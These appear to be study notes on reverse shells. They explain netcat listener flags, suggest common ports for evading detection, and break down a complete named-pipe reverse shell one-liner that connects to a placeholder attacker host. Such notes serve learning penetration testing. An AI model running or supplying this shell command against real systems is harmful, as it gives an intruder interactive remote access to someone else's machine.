
![](../../assets/Pasted%20image%2020260820230314.png)

The connections initiate from the target system to the attacker's machine, which can help avoid detection from network firewalls and other security appliances.


`-l` option to indicate Netcat to listen

`v` option enables verbose mode

`-n` option prevents the connections from using DNS for lookup,

`p` flag indicates the port

like **53**, **80**, **8080**, **443**, **139**, or **445**. This is to blend the reverse shell with legitimate traffic and avoid detection by security appliances.

##### **Gaining Reverse Shell Access**

analyze an example payload named a **pipe reverse shell**, as shown below.

`rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc ATTACKER_IP ATTACKER_PORT >/tmp/f`

`rm -f /tmp/f` - This command removes any existing named pipe file located at `/tmp/f/`. This ensures that the script can create a new named pipe without conflicts.

A **pipe file** (often called a **FIFO — First In, First Out**) is a special type of file in Linux/Unix that lets **two processes communicate with each other**.


`mkfifo /tmp/f` - This command creates a named pipe, or FIFO (first-in, first-out), at `/tmp/f`. Named pipes allow for two-way communication between processes. In this context, it acts as a conduit for input and output.

`cat /tmp/f` - This command reads data from the named pipe. It waits for input that can be sent through the pipe.

`| bash -i 2>&1` - The output of `cat` is piped to a shell instance (`bash -i`), which allows the attacker to execute commands interactively. The `2>&1` redirects standard error to standard output, ensuring that error messages are sent back to the attacker.

Linux processes have:

0 → stdin   (input)

1 → stdout  (normal output)

2 → stderr  (error output)

Therefore:

2>&1


`| nc ATTACKER_IP ATTACKER_PORT >/tmp/f` - This part pipes the shell's output through `nc` (Netcat) to the attacker's IP address (`ATTACKER_IP`) on the attacker's port (`ATTACKER_PORT`).

`>/tmp/f` -This final part sends the output of the commands back into the named pipe, allowing for bi-directional communication.